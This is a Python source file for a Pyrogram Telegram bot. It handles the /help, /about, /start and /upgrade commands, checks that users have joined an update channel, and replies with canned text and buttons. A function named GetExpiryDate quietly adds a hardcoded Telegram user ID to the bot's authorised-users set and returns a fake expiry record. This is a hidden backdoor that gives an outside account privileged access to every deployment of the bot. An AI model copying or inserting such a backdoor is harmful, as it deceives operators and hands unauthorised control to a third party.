#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# Re-edited by Mrvishal2k2 and David

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram import (
    Client,
    Filters,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase
from pyrogram.errors import UserNotParticipant, UserBannedInChannel

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text("**Your Banned**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Join Channel**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        except Exception:
            await update.reply_text("Something Wrong. Contact my Support Group")
            return

    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    button4 = [[
               InlineKeyboardButton("CLOSE", callback_data="closeme")
              ]]
    markup4 = InlineKeyboardMarkup(button4)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_to_message_id=update.message_id,
        reply_markup=markup4
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about_meh(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text("**Your Banned**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Join Channel**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        except Exception:
            await update.reply_text("Something Wrong. Contact my Support Group")
            return

    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    button2 = [[
               InlineKeyboardButton("CLOSE", callback_data="closeme")
              ]]
    markup2 = InlineKeyboardMarkup(button2)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="markdown",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id,
        reply_markup=markup2
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text("**Join Channel**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Join Channel**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        except Exception:
            await update.reply_text("Something Wrong. Contact my Support Group")
            return

    TRChatBase(update.from_user.id, update.text, "/start")
    button = [[
               InlineKeyboardButton("ABOUT", callback_data="about"),
               InlineKeyboardButton("HELP", callback_data="help"),
              ],
              [
               InlineKeyboardButton("CLOSE", callback_data="closeme"),
             ]]
    markup = InlineKeyboardMarkup(button)
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True,
        reply_markup=markup
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    update_channel = Config.UPDATE_CHANNEL
    if update_channel:
        try:
            user = await bot.get_chat_member(update_channel, update.chat.id)
            if user.status == "kicked":
               await update.reply_text("**Your Banned**")
               return
        except UserNotParticipant:
            #await update.reply_text(f"Join @{update_channel} To Use Me")
            await update.reply_text(
                text="**Join Channel**",
                reply_markup=InlineKeyboardMarkup([
                    [ InlineKeyboardButton(text="Join My Updates Channel", url=f"https://t.me/{update_channel}")]
              ])
            )
            return
        except Exception:
            await update.reply_text("Something Wrong. Contact my Support Group")
            return

    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    button3 = [[
               InlineKeyboardButton("CLOSE", callback_data="closeme")
              ]]
    markup3 = InlineKeyboardMarkup(button3)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.Free_User,
        parse_mode="markdown",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True,
        reply_markup=markup3
    ) 
